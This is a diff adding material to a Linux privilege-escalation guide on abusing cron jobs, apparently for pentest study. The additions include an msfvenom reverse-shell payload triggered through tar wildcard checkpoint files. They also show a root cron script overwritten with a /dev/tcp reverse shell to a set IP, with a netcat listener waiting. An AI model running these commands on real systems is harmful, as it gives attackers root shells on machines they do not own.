@@ -476,6 +476,8 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 
 ## Scheduled/Cron jobs
 
+Cron jobs are scripts or programs scheduled to run at specific times or intervals, executing with the user's permissions. By default, they run using the `/bin/sh` shell with limited environment variables. Cron job configurations are stored in crontab files, typically located in `/var/spool/cron/` for user-specific jobs and `/etc/crontab` for system-wide jobs.
+
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 
 ```bash
@@ -488,6 +490,13 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 
 For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
+using Linux smart enumeration script (lse.sh)
+```bash
+lse.sh -l 1 -i 
+[*] ret050 Can we write to any paths present in cron jobs.................. yes!
+---
+/home/user
+```
 (_Note how the user "user" has writing privileges over /home/user_)
 
 If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
@@ -509,11 +518,47 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 
 **If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**
 
-Read the following page for more wildcard exploitation tricks:
+***GTFOBins (https://gtfobins.github.io) can help determine
+whether a command has command line options which will be useful for our purposes.***
 
-{% content-ref url="wildcards-spare-tricks.md" %}
+example:
+1. **Check system-wide crontab**:  
+   The system crontab (`/etc/crontab`) runs a script as root every minute:
+   ```
+   * * * * * root /usr/local/bin/compress.sh
+   ```
+
+2. **Inspect the script**:  
+   The script (`compress.sh`) uses `tar` to compress the `/home/user` directory:
+   ```sh
+   tar czf /tmp/backup.tar.gz *
+   ```
+
+3. **Exploit via GTFOBins**:  
+   The `tar` command has a checkpoint feature that can be exploited to execute arbitrary commands.
+
+4. **Generate a reverse shell payload**:  
+   Use `msfvenom` to create a reverse shell payload:
+   ```bash
+   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf -o shell.elf
+   ```
+
+5. **Prepare the exploit**:  
+   Place the payload (`shell.elf`) in the `/home/user` directory and create two specific checkpoint files:
+   ```bash
+   touch /home/user/--checkpoint=1
+   touch /home/user/--checkpoint-action=exec=shell.elf
+   ```
+
+6. **Catch the reverse shell**:  
+   Set up a netcat listener on your machine:
+   ```bash
+   nc -nvlp 53
+   ```
+   Wait for the cron job to run and connect back, providing root access on the remote host.
+
+Read the following page for more wildcard exploitation tricks:
 [wildcards-spare-tricks.md](wildcards-spare-tricks.md)
-{% endcontent-ref %}
 
 ### Cron script overwriting and symlink
 
@@ -524,6 +569,39 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
+example: 
+
+- **Steps to exploit:**
+  1. **View system-wide crontab:**
+     ```bash
+     cat /etc/crontab
+     ```
+     Example:  
+     `* * * * * root overwrite.sh`
+  2. **Locate the script:**
+     ```bash
+     locate overwrite.sh
+     ```
+     Example:  
+     `/usr/local/bin/overwrite.sh`
+  3. **Check permissions:**
+     ```bash
+     ls -l /usr/local/bin/overwrite.sh
+     ```
+     If writable by others:  
+     `-rwxr--rw- 1 root staff /usr/local/bin/overwrite.sh`
+  4. **Replace script content:**
+     ```bash
+     #!/bin/bash
+     bash -i >& /dev/tcp/192.168.1.26/53 0>&1
+     ```
+  5. **Start netcat listener:**
+     ```bash
+     nc -nvlp 53
+     ```
+
+- **Result:** A reverse shell as root should be caught.
+
 
 If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you
 
